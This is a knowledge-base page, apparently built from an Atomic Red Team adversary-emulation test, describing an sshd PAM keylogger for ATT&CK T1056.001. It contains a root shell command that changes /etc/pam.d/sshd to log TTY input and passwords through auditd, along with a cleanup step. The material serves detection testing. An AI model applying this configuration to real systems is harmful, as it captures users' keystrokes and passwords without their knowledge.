---
atomic_guid: "81d7d2ad-d644-4b6a-bea7-28ffe43becca"
title: "SSHD PAM keylogger"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.001"
attack_technique_name: "Input Capture: Keylogging"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml"
build_date: "2026-04-27 19:12:26"
executor: "sh"
aliases:
  - "81d7d2ad-d644-4b6a-bea7-28ffe43becca"
  - "SSHD PAM keylogger"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture#^t1056001-keylogging|T1056.001: Keylogging]]

## Input Arguments

### user_account

- description: Basic ssh user account for testing.
- type: string
- default: ubuntu

## Dependencies

This test requires sshd and auditd

### Prerequisite Check

```bash
if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
```

### Get Prerequisite

```bash
echo ""
```

## Executor

- elevation_required: True
- name: sh

### Command

```bash
cp -v /etc/pam.d/sshd /tmp/
echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" >> /etc/pam.d/sshd
systemctl restart sshd
systemctl restart auditd
ssh #{user_account}@localhost 
whoami
sudo su
whoami
exit
exit
```

### Cleanup

```bash
cp -fv /tmp/sshd /etc/pam.d/
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml)
